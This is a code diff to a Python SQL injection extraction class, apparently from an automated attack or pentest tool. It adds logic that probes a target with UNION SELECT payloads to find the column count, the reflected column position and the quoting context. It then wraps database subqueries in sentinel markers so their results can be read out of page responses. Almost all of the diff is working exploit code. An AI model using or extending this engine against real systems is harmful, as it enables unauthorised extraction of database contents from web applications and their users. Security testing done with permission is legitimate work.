@@ -150,7 +150,9 @@ class SQLiExtractor:
         self.config = config
         self.db = _DB_BUILDERS[self.db_type]
         self.result = ExtractionResult(db_type=self.db_type)
-        self._col_count: int | None = None  # cached once found
+        self._col_count: int | None = None        # cached after first successful UNION
+        self._reflected_col: int | None = None    # column position that echoes back in response
+        self._inject_prefix: str = "'"            # string context default; set to " " for numeric
 
     async def run(self) -> ExtractionResult:
         """Run the full extraction pipeline and return the result."""
@@ -261,6 +263,21 @@ class SQLiExtractor:
     _SENTINEL_START = "STELR0"
     _SENTINEL_END   = "0RLETS"
 
+    _MISMATCH_SIGNALS = (
+        "same number of columns",
+        "each union query must have",
+        "different number of columns",
+        "number of columns",
+        "must have the same",
+    )
+    _TYPE_ERROR_SIGNALS = (
+        "invalid input syntax for type integer",
+        "integer out of range",
+        "invalid input syntax for",
+        "union types",
+        "conversion failed",
+    )
+
     def _wrap_sentinel(self, subquery: str) -> str:
         """Wrap subquery output in sentinel markers using DB-appropriate concat."""
         s, e = self._SENTINEL_START, self._SENTINEL_END
@@ -270,63 +287,118 @@ class SQLiExtractor:
             return f"CONCAT('{s}',({subquery}),'{e}')"
         if self.db_type == "mssql":
             return f"'{s}'+CAST(({subquery}) AS NVARCHAR(MAX))+'{e}'"
-        # fallback — pipe concat works on most DBs
         return f"'{s}'||({subquery})||'{e}'"
+
+    def _build_union(self, col_count: int, position: int, value_expr: str, comment: str, prefix: str = "'") -> str:
+        """Build a UNION SELECT payload with `value_expr` at `position`, NULLs elsewhere."""
+        parts = ["NULL"] * col_count
+        parts[position] = value_expr
+        return f"{prefix} UNION SELECT {','.join(parts)}{comment}"
+
+    async def _find_col_count_and_position(self, wrapped: str, comment: str) -> bool:
+        """
+        Two-phase UNION discovery.
+
+        Phase 1: Find column count using NULL-only probes (type-safe, fast).
+        Phase 2: For each column position try placing the sentinel there;
+                 cache `_col_count` + `_reflected_col` on first success.
+
+        Returns True if a working combination was found.
+        """
+        prefixes = [("'", "string"), (" ", "numeric"), ("')", "paren")]
+
+        for prefix, ctx_label in prefixes:
+            for col_count in range(1, 16):
+                # Phase 1: NULL-only probe to confirm column count
+                null_payload = f"{prefix} UNION SELECT {','.join(['NULL']*col_count)}{comment}"
+                try:
+                    resp = await self.inject(null_payload)
+                except Exception as exc:
+                    log.debug(f"sqli-extract: null probe failed ({ctx_label}, n={col_count}): {exc}")
+                    continue
+
+                lower = resp.lower()
+                if any(s in lower for s in self._MISMATCH_SIGNALS):
+                    log.debug(f"sqli-extract: col_count={col_count} mismatch ({ctx_label})")
+                    continue  # try next col_count
+
+                log.debug(f"sqli-extract: col_count={col_count} OK ({ctx_label}) — probing positions")
+
+                # Phase 2: try each position with the sentinel
+                for pos in range(col_count):
+                    sentinel_payload = self._build_union(col_count, pos, wrapped, comment, prefix)
+                    try:
+                        sentinel_resp = await self.inject(sentinel_payload)
+                    except Exception as exc:
+                        log.debug(f"sqli-extract: sentinel probe failed (pos={pos}): {exc}")
+                        continue
+
+                    pos_lower = sentinel_resp.lower()
+                    if any(s in pos_lower for s in self._MISMATCH_SIGNALS):
+                        log.debug(f"sqli-extract: col_count changed during position probe — restarting")
+                        break
+                    if any(s in pos_lower for s in self._TYPE_ERROR_SIGNALS):
+                        log.debug(f"sqli-extract: type error at pos={pos} — trying next position")
+                        continue
+
+                    value = self._extract_value(sentinel_resp)
+                    if value:
+                        self._col_count = col_count
+                        self._reflected_col = pos
+                        self._inject_prefix = prefix
+                        log.info(f"sqli-extract: ✓ found injection at col_count={col_count}, position={pos}, context={ctx_label}")
+                        return True
+
+                    log.debug(f"sqli-extract: sentinel not found in response at pos={pos} ({len(sentinel_resp)}b)")
+
+        log.debug("sqli-extract: exhausted all col_counts/positions — no reflected column found")
+        return False
 
     async def _union_scalar(self, subquery: str) -> str:
         """
         Inject a UNION SELECT and return the reflected value.
 
-        Strategy (in order per column count):
-          1. Try NULL-padded UNION with sentinel-wrapped subquery (string context).
-          2. If column-count mismatch → increment and retry.
-          3. If "works" but no sentinel in response → try numeric context prefix.
-          4. Cache the working column count on first success.
+        On first call, runs two-phase discovery to find (col_count, reflected_position).
+        On subsequent calls, uses the cached values directly.
         """
         comment = self.db["comment"]
         wrapped = self._wrap_sentinel(subquery)
 
-        col_range = [self._col_count] if self._col_count else range(1, 16)
-
-        for col_count in col_range:
-            compat = self._compat_cols(col_count - 1)
-            parts = [wrapped] + ([compat] if compat else [])
-            cols_str = ",".join(parts)
-
-            # Context 1: string context  (' UNION SELECT ...)
-            for prefix in (f"' UNION SELECT {cols_str}{comment}",
-                           f" UNION SELECT {cols_str}{comment}",
-                           f"') UNION SELECT {cols_str}{comment}"):
-                try:
-                    log.debug(f"sqli-extract: UNION probe col_count={col_count} prefix={prefix[:40]!r}")
-                    response = await self.inject(prefix)
-                except Exception as exc:  # noqa: BLE001
-                    log.debug(f"sqli-extract: inject failed: {exc}")
-                    continue
-
-                lower = response.lower()
-
-                # Column count mismatch — try next count
-                if any(s in lower for s in (
-                    "same number of columns",
-                    "each union query must have",
-                    "different number of columns",
-                    "number of columns",
-                )):
-                    log.debug(f"sqli-extract: col_count={col_count} mismatch with prefix {prefix[:30]!r}")
-                    break  # try next col_count, not next prefix
-
+        # If we already know the working combination, use it directly
+        if self._col_count is not None and self._reflected_col is not None:
+            payload = self._build_union(self._col_count, self._reflected_col, wrapped, comment, self._inject_prefix)
+            try:
+                response = await self.inject(payload)
                 value = self._extract_value(response)
                 if value:
-                    log.debug(f"sqli-extract: ✓ got value (col_count={col_count}): {value[:60]!r}")
-                    if not self._col_count:
-                        self._col_count = col_count
+                    log.debug(f"sqli-extract: extracted (cached position): {value[:60]!r}")
                     return value
+                # Cached position stopped working — reset and rediscover
+                log.debug("sqli-extract: cached position no longer reflects — rediscovering")
+                self._col_count = None
+                self._reflected_col = None
+            except Exception as exc:  # noqa: BLE001
+                log.debug(f"sqli-extract: cached inject failed: {exc}")
+                return ""
 
-                log.debug(f"sqli-extract: sentinel not found in response ({len(response)} bytes)")
+        # Discovery phase
+        found = await self._find_col_count_and_position(wrapped, comment)
+        if not found:
+            return ""
 
-        log.debug("sqli-extract: _union_scalar exhausted all column counts — no value extracted")
-        return ""
+        # Now use the cached position to get the actual value
+        payload = self._build_union(
+            self._col_count, self._reflected_col, wrapped, comment, self._inject_prefix
+        )
+        try:
+            response = await self.inject(payload)
+            value = self._extract_value(response)
+            if value:
+                log.debug(f"sqli-extract: extracted value: {value[:80]!r}")
+            return value
+        except Exception as exc:  # noqa: BLE001
+            log.debug(f"sqli-extract: final extract inject failed: {exc}")
+            return ""
 
     def _compat_cols(self, count: int) -> str:
         """NULL is type-agnostic and works across all SQL dialects for padding."""
@@ -338,22 +410,22 @@ class SQLiExtractor:
         """
         Extract the injected value from the response.
 
-        Primary method: sentinel search (reliable regardless of HTML structure).
-        Fallback 1: JSON longest-string (for JSON APIs).
-        Fallback 2: regex (last resort, returns empty if ambiguous).
+        Primary: sentinel markers (STELR0...0RLETS) — reliable in both HTML and JSON.
+        Fallback 1: JSON longest-string for clean API responses.
+        Fallback 2: conservative regex (only when unambiguous).
         """
         s, e = self._SENTINEL_START, self._SENTINEL_END
 
-        # Primary: sentinel markers
+        # Primary: sentinel search
         idx_start = response_body.find(s)
         if idx_start != -1:
             idx_end = response_body.find(e, idx_start + len(s))
             if idx_end != -1:
                 extracted = response_body[idx_start + len(s):idx_end].strip()
-                if extracted:
+                if extracted and not self._looks_like_error(extracted):
                     return extracted
 
-        # Fallback 1: JSON response
+        # Fallback 1: JSON response — return the longest non-error string value
         try:
             data = json.loads(response_body)
             val = self._longest_json_string(data)
@@ -361,16 +433,6 @@ class SQLiExtractor:
                 return val
         except (json.JSONDecodeError, TypeError, ValueError):
             pass
-
-        # Fallback 2: regex (very conservative — only return if unambiguous)
-        matches = re.findall(
-            r'(?<!["\w/])([A-Za-z0-9_.@\-]{8,}\s[A-Za-z0-9_.@\-\s]{4,})(?!["\w/])',
-            response_body,
-        )
-        # Only use regex result if exactly one long match (avoids grabbing nav/CSS)
-        unique = [m.strip() for m in matches if len(m.strip()) > 10 and not self._looks_like_error(m)]
-        if len(unique) == 1:
-            return unique[0]
 
         return ""
 
